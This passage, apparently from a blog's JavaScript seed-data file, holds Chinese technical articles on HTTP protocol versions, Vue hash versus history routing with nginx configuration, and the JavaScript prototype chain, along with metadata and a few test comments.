版本发布，内容大大增加。\n\n任何格式的内容都可以发送。这使得互联网不仅可以传输文字，还能传输图像、视频、二进制文件。这为互联网的大发展奠定了基础。\n\n除了`GET`命令，还引入了`POST`命令和`HEAD`命令\n\nHTTP请求和回应的格式也变了。除了数据部分，每次通信都必须包括头信息（HTTP header），用来描述一些元数据。\n\n其他的新增功能还包括状态码（status code）、多字符集支持、多部分发送（multi-part type）、权限（authorization）、缓存（只有If-Modified-Since 和 Expires）、内容编码（content encoding）等。\n\n### 缺点\n\nHTTP/1.0 版的主要缺点是，每个TCP连接只能发送一个请求。发送数据完毕，连接就关闭，如果还要请求其他资源，就必须再新建一个连接。\n\nhttp1.0，在浏览器请求一个包含有许多图像的网页，如：www.aaa.com/index.html，首先和www.aaa.com建立tcp连接，拿到了index.html后就断开连接，拿到index.html后发现里面还有很多图片，继续建立tcp连接获取图片，如果有十个图片就会进行十次tcp连接过程\n\n为了解决这个问题，有些浏览器在请求时，用了一个非标准的`Connection`字段。\n\n> ```http\n> Connection: keep-alive\n> ```\n\n这个字段要求服务器不要关闭TCP连接，以便其他请求复用。服务器同样回应这个字段。\n\n> ```http\n> Connection: keep-alive\n> ```\n\n一个可以复用的TCP连接就建立了，直到客户端或服务器主动关闭连接。但是，这不是标准字段，不同实现的行为可能不一致，因此不是根本的解决办法。\n\n# HTTP1.1\n\nhttp1.1是目前最为主流的http协议版本，从1999年发布至今，仍是主流的http协议版本。\n\n## 持久连接\n\nHTTP/1.1 最大的变化就是引入了持久连接（persistent connection），在HTTP/1.1中默认开启 `Connection: keep-alive`，即TCP连接默认不关闭，可以被多个请求复用。\n\n> 一个包含有许多图像的网页文件中并没有包含真正的图像数据内容，而只是指明了这些图像的URL地址，当WEB浏览器访问这个网页文件时，浏览器首先要发出针对该网页文件的请求，当浏览器解析WEB服务器返回的该网页文档中的HTML内容时，发现其中的图像标签后，浏览器将根据标签中的src属性所指定的URL地址再次向服务器发出下载图像数据的请求。显然，访问一个包含有许多图像的网页文件的整个过程包含了多次请求和响应，每次请求和响应都需要建立一个单独的连接，每次连接只是传输一个文档和图像，上一次和下一次请求完全分离。即使图像文件都很小，但是**客户端和服务器端每次建立和关闭连接却是一个相对比较费时的过程，并且会严重影响客户机和服务器的性能**\n\n> 同一个 tcp 连接，http1.1 允许一次发送多个 http1.1 请求，也就是说，不必等前一个响应收到，就可以发送下一个请求，这样就解决了 http1.0 的客户端的队首阻塞。但是，http1.1 规定，服务器端的响应的发送要根据请求被接收的顺序排队，也就是说，先接收到的请求的响应也要先发送。这样造成的问题是，如果最先收到的请求的处理时间长的话，响应生成也慢，就会阻塞已经生成了的响应的发送。也会造成队首阻塞。可见，http1.1 的队首阻塞发生在服务器端。\n\n## 管道机制\n\nHTTP/1.1 版还引入了管道机制（pipelining），即在同一个TCP连接里面，客户端可以同时发送多个请求。这样就进一步改进了HTTP协议的效率。即在同一个TCP连接里面，客户端可以同时发送多个请求。这样就进一步改进了HTTP协议的效率。举例来说，客户端需要请求两个资源。以前的做法是，在同一个TCP连接里面，先发送A请求，然后等待服务器做出回应，收到后再发出B请求。管道机制则是允许浏览器同时发出A请求和B请求，但是服务器还是按照顺序，先回应A请求，完成后再回应B请求。\n\n## 缓存处理\n\nHTTP/1.0 使用 `Pragma:no-cache + Last-Modified/If-Modified-Since`来作为缓存判断的标准；\n\nHTTP/1.1 引入了更多的缓存控制策略：`Cache-Control`、`Etag/If-None-Match`等。\n\n## 其他功能\n\n1.1版还新增了许多动词方法：`PUT`、`PATCH`、`HEAD`、 `OPTIONS`、`DELETE`。\n\n支持断点续传，通过使用请求头中的 `Range` 来实现。\n\n另外，客户端请求的头信息新增了`Host`字段，用来指定服务器的域名。\n\n> ```http\n> Host: www.example.com\n> ```\n\n有了`Host`字段，就可以将请求发往同一台服务器上的不同网站，为虚拟主机的兴起打下了基础。\n\n## 缺点\n\n虽然HTTP/1.1版允许复用TCP连接，但是同一个TCP连接里面，所有的数据通信是按次序进行的。服务器只有处理完一个回应，才会进行下一个回应。要是前面的回应特别慢，后面就会有许多请求排队等着。这称为[\"队头堵塞\"](https://zh.wikipedia.org/wiki/队头阻塞)（Head-of-line blocking）。\n\n为了避免这个问题，只有两种方法：一是减少请求数，二是同时多开持久连接（就等于原本只有一个队列，全部请求都会排队，一个阻塞了后面的就都阻塞了，这时候就多开几个队列，不用耗在这一个队列里白等。）。这导致了很多的网页优化技巧，比如合并脚本和样式表、将图片嵌入CSS代码、域名分片（domain sharding）等等。如果HTTP协议设计得更好一些，这些额外的工作是可以避免的。\n\n# HTTP2.0\n\n## 头部压缩\n\nHTTP 1.1版本会出现 **「User-Agent、Cookie、Accept、Server、Range」** 等字段可能会占用几百甚至几千字节，而 Body 却经常只有几十字节，所以导致头部偏重。\n\nHTTP 2.0 使用 `HPACK` 算法进行压缩。\n\n## 多路复用\n\nHTTP 1.x 中，如果想并发多个请求，必须使用多个 TCP 链接，且浏览器为了控制资源，还会对单个域名有 6-8个的TCP链接请求限制。\n\nHTTP2中：\n\n- 同域名下所有通信都在单个连接上完成。\n- 单个连接可以承载任意数量的双向数据流。\n- 数据流以消息的形式发送，而消息又由一个或多个帧组成，多个帧之间可以乱序发送，因为根据帧首部的流标识可以重新组装，也就是`Stream ID`，流标识符，有了它，接收方就能从乱序的二进制帧中选择ID相同的帧，按照顺序组装成请求/响应报文。\n\n## 服务器推送\n\n浏览器发送一个请求，服务器主动向浏览器推送与这个请求相关的资源，这样浏览器就不用发起后续请求。\n\n- 推送资源可以由不同页面共享\n- 服务器可以按照优先级推送资源\n- 客户端可以缓存推送的资源\n- 客户端可以拒收推送过来的资源\n\n## 二进制分帧\n\n> \n\n# HTTPS\n\nHTTP 是明文传输协议，HTTPS 协议是由 SSL+HTTP 协议构建的可进行加密传输、身份认证的网络协议，比 HTTP 协议安全。\n\nHTTPS比HTTP更加安全，对搜索引擎更友好，利于SEO，谷歌、百度优先索引HTTPS网页。\n\nHTTPS标准端口443，HTTP标准端口80。\n\nHTTPS需要用到SSL证书，而HTTP不用。\n\n# 参考\n\nhttp://www.blogjava.net/zjusuyong/articles/304788.html\n\nhttps://blog.csdn.net/shadow_zed/article/details/82534283\n\nhttps://www.jianshu.com/p/3e2afe089e11\n\nhttps://www.yuque.com/u1339897/kb/pt2nba\n\nhttp://www.ruanyifeng.com/blog/2016/08/http.html\n\nHTTP 1.1与HTTP 1.0的比较：https://blog.csdn.net/hejingyuan6/article/details/50365641\n\nhttp://caibaojian.com/http-cache-code.html\n\nhttps://www.dazhuanlan.com/2020/02/03/5e379909e56c4/\n\nhttps://juejin.cn/post/6844903618890465294#heading-10\n\nhttps://juejin.cn/post/6857287743966281736#heading-2\n\nhttps://www.v2ex.com/t/525759",
      click: 88,
      createdAt: '2021-03-21T16:00:14.000Z',
      updatedAt: '2021-03-26T00:57:46.000Z',
      types: [
        {
          id: 3,
          name: '随记',
          createdAt: '2020-12-30T14:06:49.000Z',
          updatedAt: '2020-12-30T14:06:51.000Z',
          article_type: {
            id: 74,
            article_id: 74,
            type_id: 3,
            createdAt: '2021-03-21T16:00:14.000Z',
            updatedAt: '2021-03-21T16:00:14.000Z',
          },
        },
      ],
      stars: [],
      users: [
        {
          id: 1,
          username: 'hss',
          status: 1,
          avatar: 'https://img.cdn.hsslive.cn/1613141138717Billd.jpg',
          title: 'hello world',
          createdAt: '2020-10-10T15:24:44.000Z',
          updatedAt: '2021-11-28T12:14:36.000Z',
          user_article: {
            id: 74,
            user_id: 1,
            article_id: 74,
            createdAt: '2021-03-21T16:00:14.000Z',
            updatedAt: '2021-03-21T16:00:14.000Z',
          },
        },
      ],
      comments: [],
      tags: [
        {
          id: 23,
          name: '计算机网络',
          color: '#f6eb9c',
          createdAt: '2021-02-22T15:59:46.000Z',
          updatedAt: '2021-02-22T15:59:48.000Z',
        },
      ],
    },
    {
      id: 73,
      title: 'vue的两种路由模式',
      is_comment: 1,
      status: 1,
      img: '/1616317412921vue两种路由.jpg',
      content:
        '# vue的两种路由模式\n\n> vue的两种路由模式分别是hash和history模式。\n>\n> 为什么在开发环境下，使用history模式的时候刷新都不报错，而打包成静态文件上线后，打开项目空白页面（这个大多数是在配置文件配置：publicPath: \'./\'可解决），或者打开时显示正常，跳转也正常，但是刷新就报404？\n>\n> 因为打包成静态文件上线后，这个项目就只是一个静态文件，它只是被你的nginx或其他代理服务器给托管起来了，在这个项目里进行F5刷新，还是会等于请求url，如果匹配不到相应的路径就还是会报404\n>\n> 而在开发环境下，是有一个服务（8080端口）托管起来的，个人猜测应该是vue脚手架应该做了很多处理，比如刷新的时候匹配不到路径就跳转/，所以在开发环境下是不会报404的。\n>\n> 而hash模式不一样不管在开发还是打包成dist静态文件后，都不会报404，比如直接找打包后的dist文件里面的index.html打开访问，然后刷新都不会报404，因为刷新只会带#号前面的url进行查找，即#号后面不管是什么，刷新都是跳#号前面的原路径 \n\n# hash路由\n\n## 配置nginx\n\n配置好nginx后，在nginx根目录新建hashDeom文件夹，里面新建一个index.html，然后即可在浏览器打开localhost:5001端口进行调试，比如我的nginx根目录是：D:\\phpstudy_pro\\Extensions\\Nginx1.15.11，就在这里新建一个hashDeom夹，然后再在里面新建index.html即可通过localhost:5001端口访问\n\n```bash\nserver {\n    listen       5001;\n    server_name  localhost;\n    gzip on;\n    # 进行压缩的文件类型。\n    gzip_types text/plain application/javascript application/x-javascript text/css application/xml text/javascript application/x-httpd-php image/jpeg image/gif image/png;\n    # 是否在http header中添加Vary: Accept-Encoding，建议开启\n    gzip_vary on;\n    location / {\n        root   hashDemo;\n        index  index.html index.htm;\n    }\n    location /profile {\n        default_type application/json ;\n        return 200  \'{"name":"profile","result":"profile-success"}\';\n    }\n    location /homeAjax {    #不区分大小写，homeajax和HOMEAJAX等等都可匹配到\n        default_type application/json ;\n        return 200  \'{"name":"homeAjax","result":"homeAjax-success"}\';\n    }\n    location /profileAjax {\n        default_type application/json ;\n        return 200  \'{"name":"profileAjax","result":"profileAjax-success"}\';\n    }\n\n}\n```\n\n## hash\n\nhash 模式下，仅 hash 符号之前的内容会被包含在请求中，比如地址栏输入：localhost:5001/#home或者localhost:5001/#profile，然后回车，实际请求的地址仍然是：localhost:5001，因此对于后端来说，只要匹配到了localhost:5001/这一个路径，就不会报404\n\n```html\n<body>\n    <h1 style="color: red;">hash模式</h1>\n    <div>\n        <h1>使用location.href方法改变url，不会发起网络请求</h1>\n        <button onClick="goHome()">home</button>\n        <button onClick="goProfile()">profile</button>\n        <button onClick="goLogin()">login</button>\n        <button onClick="goNotFount()">404</button>\n    </div>\n    <div>\n        <h1>使用history其他方法改变url，不会发起网络请求</h1>\n        <button onClick="go(1)">下一个历史记录url:go(1)</button>\n        <button onClick="go(-1)">上一个历史记录url：go(-1)</button>\n        <button onClick="go(2)">下两个历史记录url:go(2)</button>\n        <button onClick="go(-2)">上两个历史记录url:go(-2)</button>\n        <button onClick="back()">上一个历史记录url:back()</button>\n        <button onClick="forward()">下一个历史记录url:forward()</button>\n    </div>\n    <div>\n        <h1>发起网络请求</h1>\n        <button onClick="getData(\'profileAjax\')">profileAjax</button>\n        <button onClick="getData(\'homeAjax\')">homeAjax</button>\n        <span class="ajaxdata"></span>\n    </div>\n    <h1 style="color: red;">\n        当前路由：<span class="view"></span>\n    </h1>\n\n\n    <script>\n        var view = document.getElementsByClassName(\'view\')[0]\n        var ajaxdata = document.getElementsByClassName(\'ajaxdata\')[0]\n        // 监听url的变化\n        window.addEventListener("hashchange", (e) => {\n            console.log(\'hash地址栏改变了\');\n            hashchange()\n        });\n\n        // 刚进来第一次监听不到url变化，因此需要先执行一次\n        hashchange()\n\n        function hashchange() {\n            // 更新视图\n            // view.innerHTML = location.href\n            switch (location.hash) {\n                case "":\n                    view.innerHTML = \'当前是网站首页\'\n                    // view.innerHTML = location\n                    break;\n                case "#home":\n                    view.innerHTML = location.hash\n                    // view.innerHTML = location\n                    break;\n                case "#profile":\n                    view.innerHTML = location.hash\n                    // view.innerHTML = location\n                    break;\n                case "#login":\n                    view.innerHTML = location.hash\n                    // view.innerHTML = location\n                    break;\n                default:\n                    // view.innerHTML = \'404\'\n                    view.innerHTML = \'404匹配不到：\' + location.hash\n            }\n        }\n\n        function goHome() {\n            // console.log(\'goHome\');\n            window.location.href = "#home"\n        }\n        function goProfile() {\n            // console.log(\'goProfile\');\n            window.location.href = "#profile"\n        }\n        function goLogin() {\n            // console.log(\'goLogin\');\n            window.location.href = "#login"\n        }\n        function goNotFount() {\n            // console.log(\'goNotFount\');\n            window.location.href = "#404" + Math.floor((Math.random() * 99) + 1)\n        }\n        // 请求数据\n        function getData(url) {\n            fetch(url).then(function (response) {\n                return response.json();\n            }).then(function (res) {\n                // console.log(res);\n                ajaxdata.innerHTML = JSON.stringify(res)\n            }).catch(function (err) {\n                console.log(err);\n            })\n        }\n        function go(num) {\n            history.go(num)\n        }\n        function back() {\n            // back() 方法可加载历史列表中的前一个 URL（如果存在）。\n            history.back()  // === history(-1)\n        }\n        function forward() {\n            // forward() 方法可加载历史列表中的下一个 URL。\n            history.forward()  // === history(1)\n        }\n    </script>\n</body>\n```\n\n\n\n# history路由\n\n## 配置nginx\n\n在http模块下新增server\n\n```bash\nserver {\n    listen       5002;\n    server_name  localhost;\n    gzip on;\n    # 进行压缩的文件类型。\n    gzip_types text/plain application/javascript application/x-javascript text/css application/xml text/javascript application/x-httpd-php image/jpeg image/gif image/png;\n    # 是否在http header中添加Vary: Accept-Encoding，建议开启\n    gzip_vary on;\n    location / {\n        root   historyDemo;\n        index  index.html index.htm;\n        try_files $uri $uri/ /index.html;\n    }\n    location /profile {\n        default_type application/json ;\n        return 200  \'{"name":"profile","result":"profile-success"}\';\n    }\n    location /homeAjax {    #不区分大小写，homeajax和HOMEAJAX等等都可匹配到\n        default_type application/json ;\n        return 200  \'{"name":"homeAjax","result":"homeAjax-success"}\';\n    }\n    location /profileAjax {\n        default_type application/json ;\n        return 200  \'{"name":"profileAjax","result":"profileAjax-success"}\';\n    }\n}\n```\n\n## history\n\nhistory 模式下，地址栏的路径必须要被后端匹配到，比如地址栏输入：localhost:5002/home，实际请求的地址就是localhost:5002/home，后端就必须要有匹配/home路由的处理，如果后端没有匹配/home，那么前端在地址栏输入localhost:5002/home然后回车刷新，就会报404。因为前端可以随意输入地址栏跳转，后端如果要匹配到所有的路由的话，可以使用nginx，添加一条location /记录，并且在里面添加：try_files $uri $uri/ /index.html;这样如果前端地址栏刷新时匹配不到/home，就会被/匹配到，然后就会重定向到跳转index.html\n\n```html\n<body>\n    <h1 style="color:green;">history模式</h1>\n    <div>\n        <h1>使用history.pushState方法改变url，不会发起网络请求</h1>\n        <button onClick="goHome()">home</button>\n        <button onClick="goProfile()">profile</button>\n        <button onClick="goLogin()">login</button>\n        <button onClick="goNotFount()">404</button>\n    </div>\n    <div>\n        <h1>使用history其他方法改变url，不会发起网络请求</h1>\n        <button onClick="go(1)">下一个历史记录url:go(1)</button>\n        <button onClick="go(-1)">上一个历史记录url：go(-1)</button>\n        <button onClick="go(2)">下两个历史记录url:go(2)</button>\n        <button onClick="go(-2)">上两个历史记录url:go(-2)</button>\n        <button onClick="back()">上一个历史记录url:back()</button>\n        <button onClick="forward()">下一个历史记录url:forward()</button>\n    </div>\n    <div>\n        <h1>发起网络请求</h1>\n        <button onClick="getData(\'profileAjax\')">profileAjax</button>\n        <button onClick="getData(\'homeAjax\')">homeAjax</button>\n        <span class="ajaxdata"></span>\n    </div>\n    <h1 style="color: red;">\n        当前路由：<span class="view"></span>,\n        当前路由数据：<span class="routermeta"></span>\n    </h1>\n\n    <script>\n        // 获取视图\n        var view = document.getElementsByClassName(\'view\')[0]\n        var routermeta = document.getElementsByClassName(\'routermeta\')[0]\n        var ajaxdata = document.getElementsByClassName(\'ajaxdata\')[0]\n\n        // 第一次进来先调用一次。\n        popstate()\n\n        // 监听url的变化\n        window.addEventListener("popstate", (e) => {\n            console.log(\'点击了前进/后退，history地址栏改变了\');\n            popstate()\n        });\n\n        // 监听url变化更新视图\n        function popstate() {\n            routermeta.innerHTML = JSON.stringify(history.state)\n            console.log(location)\n            switch (location.pathname) {\n                case "/":\n                    view.innerHTML = \'当前是网站首页\'\n                    view.innerHTML = location\n                    break;\n                case "/home":\n                    view.innerHTML = \'home\'\n                    // view.innerHTML = location\n                    break;\n                case "/profile":\n                    view.innerHTML = \'profile\'\n                    // view.innerHTML = location\n                    break;\n                case "/login":\n                    view.innerHTML = \'login\'\n                    // view.innerHTML = location\n                    break;\n                default:\n                    // view.innerHTML = \'404\'\n                    view.innerHTML = \'404匹配不到：\' + location.pathname\n            }\n        }\n\n        // 请求数据\n        function getData(url) {\n            fetch(url).then(function (response) {\n                return response.json();\n            }).then(function (res) {\n                // console.log(res);\n                ajaxdata.innerHTML = JSON.stringify(res)\n            }).catch(function (err) {\n                console.log(err);\n            })\n        }\n        function go(num) {\n            history.go(num)\n        }\n        function back() {\n            // back() 方法可加载历史列表中的前一个 URL（如果存在）。\n            history.back()  // === history(-1)\n        }\n        function forward() {\n            // forward() 方法可加载历史列表中的下一个 URL。\n            history.forward()  // === history(1)\n        }\n        function goHome() {\n            // console.log(\'goHome\');\n            history.pushState({ message: \'我是home\' }, "", \'/home\');\n            popstate()\n        }\n        function goProfile() {\n            // console.log(\'goProfile\');\n            history.pushState({ message: \'我是profile\' }, "", \'/profile\');\n            popstate()\n        }\n        function goLogin() {\n            // console.log(\'goLogin\');\n            history.pushState({ message: \'我是login\' }, "", \'/login\');\n            popstate()\n        }\n        function goNotFount() {\n            // console.log(\'goNotFount\');\n            history.pushState({ message: \'我是404\' }, "", \'/404\' + Math.floor((Math.random() * 99) + 1));\n            popstate()\n        }\n    </script>\n</body>\n```\n\n上面的history案例使用了nginx托管，直接在浏览器打开localhost:5002即可模拟线上环境。打开后，除了点击发起网络请求按钮外，点击其他按钮都不会发起请求，比如点了home，就会改变url地址为localhost:5002/home，但是并不会发起一个localhost:5002/home请求，这时候如果点击了home改变了地址栏后，按F5刷新，才就会发起一个localhost:5002/home请求，但是nginx匹配不到/home，因此会匹配到/，然后重定向到了原本的index.html；\n\n这里有个例外就是，如果从浏览器点击profile按钮，地址栏会变成localhost:5002/profile是不会发起网络请求的，但是如果当地址栏是localhost:5002/profile时，直接F5刷新，就会发起网络请求，然后nginx刚好有一个/profile路由记录匹配到，因此就会返回/profile返回的数据，而不会匹配到/进行重定向！\n\n# 区别\n\n共同点：都可通过改变路由(地址栏)而不刷新页面\n\n不同点：\n\n- 显示问题，hash会在地址栏上带#号，而history不会\n- history可以通过pushState可以添加任意类型数据和title到记录中，而hash只可以添加短字符串在#号后面（因为地址栏上的url长度是有限制的）\n- hash刷新时候，只会把#号之前的内容当做请求url发起请求，比如abc.com#home，只会把abc.com当做url发起请求。后端只需要匹配到abc.com就可以了；而history会把全路径发起请求，比如abc.com/home，就会把abc.com/home当做url发起请求。后端需要匹配到增加一个覆盖全路径的匹配/，让匹配不到/home时，让它重定向到一个abc.com页面（比如index.html），这样就不会报404了',
      click: 37,
      createdAt: '2021-03-21T09:03:36.000Z',
      updatedAt: '2021-03-21T09:03:36.000Z',
      types: [
        {
          id: 1,
          name: '前端',
          createdAt: '2020-12-30T14:06:49.000Z',
          updatedAt: '2020-12-30T14:06:51.000Z',
          article_type: {
            id: 73,
            article_id: 73,
            type_id: 1,
            createdAt: '2021-03-21T09:03:36.000Z',
            updatedAt: '2021-03-21T09:03:36.000Z',
          },
        },
      ],
      stars: [],
      users: [
        {
          id: 1,
          username: 'hss',
          status: 1,
          avatar: 'https://img.cdn.hsslive.cn/1613141138717Billd.jpg',
          title: 'hello world',
          createdAt: '2020-10-10T15:24:44.000Z',
          updatedAt: '2021-11-28T12:14:36.000Z',
          user_article: {
            id: 73,
            user_id: 1,
            article_id: 73,
            createdAt: '2021-03-21T09:03:36.000Z',
            updatedAt: '2021-03-21T09:03:36.000Z',
          },
        },
      ],
      comments: [],
      tags: [
        {
          id: 1,
          name: 'JavaScript',
          color: '#3b6b55',
          createdAt: '2020-12-23T16:00:00.000Z',
          updatedAt: '2021-01-01T20:17:10.000Z',
        },
        {
          id: 5,
          name: 'vue',
          color: 'rgba(65, 184, 131, 1)',
          createdAt: '2020-07-04T15:19:33.000Z',
          updatedAt: '2020-07-04T15:19:33.000Z',
        },
        {
          id: 12,
          name: 'vue-router',
          color: 'rgba(131, 109, 184, 1)',
          createdAt: '2020-07-04T16:03:11.000Z',
          updatedAt: '2020-07-04T16:03:11.000Z',
        },
      ],
    },
    {
      id: 72,
      title: '原型链',
      is_comment: 1,
      status: 1,
      img: null,
      content:
        '# 原型链\n\n这里只是通过一些案例补充之前对原型，原型链，instanceof的细节。\n\n```html\n<!DOCTYPE html>\n<html lang="en">\n\n<head>\n    <meta charset="UTF-8">\n    <meta http-equiv="X-UA-Compatible" content="IE=edge">\n    <meta name="viewport" content="width=device-width, initial-scale=1.0">\n    <title>Document</title>\n</head>\n\n<body>\n    <script>\n        // // 函数构造器\n        // console.log(Function); //ƒ Function() { [native code] }\n\n        // // 对象构造器\n        // console.log(Object); //ƒ Object() { [native code] }\n\n        // // 数组构造器\n        // console.log(Array); //ƒ Array() { [native code] }\n\n        // // 字符串构造器\n        // console.log(String); //ƒ String() { [native code] }\n\n        // // 数字构造器\n        // console.log(Number); //ƒ Number() { [native code] }\n\n        // // 布尔构造器\n        // console.log(Boolean); //ƒ Boolean() { [native code] }\n\n\n\n        // 定义一个函数（构造函数）Father\n        function Father() { }\n        // 使用构造函数创建对象father\n        var father = new Father()\n\n        // 使用字面量形式创建对象\n        var car = {}\n\n        // 使用Object构造器创建对象\n        var home = new Object()\n\n        // 使用字面量形式创建一个数组arr\n        var arr = [1, 2, 3]\n\n\n        /**\n         * prototype原型对象，即原型对象也是对象，是对象就可以通过原型链继承其原型上的属性和方法，\n         * prototype是对象，所以prototype也可通过原型链继承其原型上的属性和方法\n        */\n\n        /**\n         * 每个对象都可以通过原型链访问（或者说继承）其原型链上的属性和方法\n         * 使用构造函数创建的对象，可以通过原型链继承这个构造函数上的属性和方法（说白了就是这个构造函数的原型）\n         * */\n        console.log(father.__proto__ === Father.prototype); //true\n\n        /**\n         * 这个构造函数的原型对象，即Father.prototype，也可通过原型链继续继承它（Father.prototype）原型链上的属性和方法\n        */\n        console.log(Father.prototype.__proto__);   //true\n        console.log(Father.prototype.__proto__ === Object.prototype);   //true\n        console.log(Father.prototype.constructor === Father);   //true\n        // 通过构造函数创建的对象，可以通过原型链访问其原型\n        console.log(father.__proto__) //true\n        // 通过字面量形式创建的对象，其本身就继承Object.prototype\n        console.log(car.__proto__.constructor === Object);\n        console.log(arr.__proto__ === Array.prototype); //true\n\n        // 同理，函数实际也是一个对象，因此，函数也可以通过其原型链访问其原型\n        console.log(Function.__proto__ === Function.prototype);//true\n        console.log(Function.__proto__ === Function.prototype);//true\n        console.log(Function);\n\n\n\n\n        console.log(Function.prototype); //ƒ () { [native code] }\n        /**\n         * 所有函数都有自己的prototype\n         */\n        console.log(Object.prototype); //{constructor: ƒ, __defineGetter__: ƒ, __defineSetter__: ƒ, hasOwnProperty: ƒ, __lookupGetter__: ƒ, …}\n        console.log(Array.prototype); //[constructor: ƒ, concat: ƒ, copyWithin: ƒ, fill: ƒ, find: ƒ, …]\n        console.log(String.prototype); //String {"", constructor: ƒ, anchor: ƒ, big: ƒ, blink: ƒ, …}\n        console.log(Number.prototype); //Number {0, constructor: ƒ, toExponential: ƒ, toFixed: ƒ, toPrecision: ƒ, …}\n        console.log(Boolean.prototype); //Boolean {false, constructor: ƒ, toString: ƒ, valueOf: ƒ}\n\n\n        console.log(Array.prototype === Function.prototype); //false\n        console.log(String.prototype === Function.prototype); //false\n        console.log(Number.prototype === Function.prototype); //false\n\n        console.log(Object.__proto__ === Function.prototype);  //true\n        console.log(Array.__proto__ === Function.prototype);   //true\n        console.log(Function.__proto__ === Function.prototype);//true\n        console.log(String.__proto__ === Function.prototype);  //true\n        console.log(Number.__proto__ === Function.prototype);  //true\n        console.log(Boolean.__proto__ === Function.prototype); //true\n        /**\n         * Object.protype是原型链的顶端，它在往上就是null\n         * 其余所有对象（Array,String,Number...）会通过原型链继承Object.prototype\n         */\n        console.log(Object.prototype\n            .__proto__\n        ); //null\n        console.log(Array.prototype\n            .__proto__\n        ); //{constructor: ƒ, __defineGetter__: ƒ, __defineSetter__: ƒ, hasOwnProperty: ƒ, __lookupGetter__: ƒ, …}\n        console.log(String.prototype\n            .__proto__\n        ); //{constructor: ƒ, __defineGetter__: ƒ, __defineSetter__: ƒ, hasOwnProperty: ƒ, __lookupGetter__: ƒ, …}\n        console.log(Number.prototype\n            .__proto__\n        ); //{constructor: ƒ, __defineGetter__: ƒ, __defineSetter__: ƒ, hasOwnProperty: ƒ, __lookupGetter__: ƒ, …}\n        console.log(Boolean.prototype\n            .__proto__\n        ); //{constructor: ƒ, __defineGetter__: ƒ, __defineSetter__: ƒ, hasOwnProperty: ƒ, __lookupGetter__: ƒ, …}\n        console.log(Array.prototype.__proto__ === Object.prototype); //true\n        console.log(String.prototype.__proto__ === Object.prototype); //true\n        console.log(Number.prototype.__proto__ === Object.prototype); //true\n        console.log(Boolean.prototype.__proto__ === Object.prototype); //true\n        console.log(Array);         //ƒ Array() { [native code] }\n        console.log(Array.prototype); //prototype是原型对象，对象就有__proto__。它还有constructor保存本身，还有本身的属性以及方法\n        console.log(Array.prototype.constructor === Array); //true\n        console.log(Array.__proto__ === Function.prototype); //true\n        console.log(Array.prototype.__proto__);     //{constructor: ƒ, __defineGetter__: ƒ, __defineSetter__: ƒ, hasOwnProperty: ƒ, __lookupGetter__: ƒ, …}\n        console.log(\'--------------\');\n\n\n\n        /**\n         * 所有对象都可以通过new创建，比如数组：new Array()；对象：new Object()；函数：new Function()；字符串：new String()....\n         * new后面的叫构造函数，即Array();Object();Function();String()...都是构造函数\n         * 构造函数也是函数，那么就有一个问题，js所有东西都是对象的话，是先有对象还是现有构造函数？（因为对象也是new出来的）\n         * 如果是先有函数，再通过函数new产生的对象，那么函数又是怎么来的？所以就类似：先有鸡还是现有鸡蛋的问题。\n         * 所以，函数是怎么来的？这个解释了就说的通了\n         * */\n\n        /**\n         * 函数有prototype，对象有__proto__\n         * 函数可以通过prototype.constructor访问自己构造它的函数\n         * 对象可以通过__proto__继承上层的prototype\n        */\n        console.log(Function instanceof Object);                         //true\n        // 函数就有prototype\n        console.log(Function.prototype instanceof Object);               //true\n        console.log(Function.prototype.__proto__ instanceof Object);     //fasle\n        // 函数也是一个对象，对象就有__proto__，所以函数有__proto__\n        console.log(Function.__proto__ instanceof Object);               //true\n        console.log(Function.__proto__ instanceof Object);               //true\n        console.log(Function.__proto__.__proto__ instanceof Object);     //false\n        console.log(Function.__proto__.__proto__ instanceof Object);     //false\n\n        console.log(Function.constructor === Function);                  //true\n        console.log(\'-----------------------\');\n\n        var cat = {}\n        function Dog() { }\n        var dog = new Dog()\n\n        console.log(cat.__proto__ === Function.prototype);      //false\n        console.log(dog.__proto__ === Function.prototype);    //false\n        console.log(cat.__proto__ === Object.prototype);         //true\n        console.log(dog.__proto__ === Object.prototype);          //false\n        console.log(cat.__proto__ === dog.__proto__);             //false\n        console.log(dog.__proto__ === Dog.prototype);             //true\n\n    </script>\n</body>\n\n</html>\n```\n\n# 图解\n\n这里引用网上的图，个人也认为这张图很具体很全面。\n\n![原型链.jpg](https://img.cdn.hsslive.cn/1615859178126原型链.jpg)',
      click: 135,
      createdAt: '2021-03-16T01:46:48.000Z',
      updatedAt: '2021-03-16T01:46:48.000Z',
      types: [
        {
          id: 1,
          name: '前端',
          createdAt: '2020-12-30T14:06:49.000Z',
          updatedAt: '2020-12-30T14:06:51.000Z',
          article_type: {
            id: 72,
            article_id: 72,
            type_id: 1,
            createdAt: '2021-03-16T01:46:48.000Z',
            updatedAt: '2021-03-16T01:46:48.000Z',
          },
        },
      ],
      stars: [],
      users: [
        {
          id: 1,
          username: 'hss',
          status: 1,
          avatar: 'https://img.cdn.hsslive.cn/1613141138717Billd.jpg',
          title: 'hello world',
          createdAt: '2020-10-10T15:24:44.000Z',
          updatedAt: '2021-11-28T12:14:36.000Z',
          user_article: {
            id: 72,
            user_id: 1,
            article_id: 72,
            createdAt: '2021-03-16T01:46:48.000Z',
            updatedAt: '2021-03-16T01:46:48.000Z',
          },
        },
      ],
      comments: [
        {
          id: 22,
          article_id: 72,
          from_user_id: 24,
          to_comment_id: -1,
          to_user_id: -1,
          content: '哈哈哈',
          createdAt: '2021-03-17T14:29:06.000Z',
          updatedAt: '2021-03-17T14:29:06.000Z',
        },
        {
          id: 23,
          article_id: 72,
          from_user_id: 24,
          to_comment_id: -1,
          to_user_id: -1,
          content: '哈你就是傻逼',
          createdAt: '2021-03-17T14:29:13.000Z',
          updatedAt: '2021-03-17T14:29:13.000Z',
        },
        {
          id: 24,
          article_id: 72,
          from_user_id: 24,
          to_comment_id: 22,
          to_user_id: 24,
          content: '12321321321312312312',
          createdAt: '2021-03-17T14:29:27.000Z',
          updatedAt: '2021-03-17T14:29:27.000Z',
        },
        {
          id: 25,
          article_id: 72,
          from_user_id: 24,
          to_comment_id: 22,
          to_user_id: 24,
          content: '？？？？？？？？？',
          createdAt: '2021-03-17T14:30:03.000Z',
          updatedAt: '2021-03-17T14:30:03.000Z',
        },
        {
          id: 26,
          article_id: 72,
          from_user_id: 24,
          to_comment_id: 22,
          to_user_id: 24,
          content: '？？？？？？',
          createdAt: '2021-03-17T14:31:48.000Z',
          updatedAt: '2021-03-17T14:31:48.000Z',
        },
        {
          id: 27,
          article_id: 72,
          from_user_id: 24,
          to_comment_id: 22,
          to_user_id: 24,
          content: '最后一次1111',
